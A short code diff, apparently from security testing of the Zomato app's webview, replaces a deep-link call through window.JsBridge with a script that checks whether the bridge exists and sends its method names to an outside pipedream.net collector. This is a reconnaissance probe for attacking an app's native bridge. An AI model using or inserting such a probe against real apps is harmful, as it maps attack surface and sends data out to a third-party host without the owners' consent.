@@ -1,4 +1,7 @@
 <script>
-  // Calls openDeeplink with an internal screen deep link
-  window.JsBridge.openDeeplink('zomato://webview?url=https://www.zomato.com/webroutes/getPage?page_url=/profile');
+  if (typeof window.JsBridge !== 'undefined') {
+    fetch('https://eomfuajl79ed6za.m.pipedream.net?bridge=exists&methods=' + encodeURIComponent(Object.getOwnPropertyNames(window.JsBridge).join(',')))
+  } else {
+    fetch('https://eomfuajl79ed6za.m.pipedream.net?bridge=undefined')
+  }
 </script>
